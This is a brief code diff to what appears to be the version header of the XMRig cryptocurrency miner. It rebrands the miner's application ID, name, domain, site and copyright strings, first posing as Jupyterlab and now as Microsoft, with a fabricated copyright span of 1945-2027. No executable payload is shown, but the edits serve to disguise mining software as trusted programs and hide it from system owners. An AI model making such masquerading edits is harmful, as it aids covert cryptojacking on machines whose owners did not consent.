@@ -19,14 +19,14 @@
 #ifndef XMRIG_VERSION_H
 #define XMRIG_VERSION_H
 
-#define APP_ID        "Jupyterlab"
-#define APP_NAME      "Jupyter"
-#define APP_DESC      "Jupyterlab"
+#define APP_ID        "Microsoft"
+#define APP_NAME      "Microsoft"
+#define APP_DESC      "Microsoft"
 #define APP_VERSION   "2.0.2.4"
-#define APP_DOMAIN    "youtube.com"
-#define APP_SITE      "www.youtube.com"
-#define APP_COPYRIGHT "Copyright (C) 1945-2027 Jovyan"
-#define APP_KIND      "Jovyan"
+#define APP_DOMAIN    "microsoft.com"
+#define APP_SITE      "www.microsoft.com"
+#define APP_COPYRIGHT "Copyright (C) 1945-2027 Microsoft"
+#define APP_KIND      "Microsoft"
 
 #define APP_VER_MAJOR  6
 #define APP_VER_MINOR  21
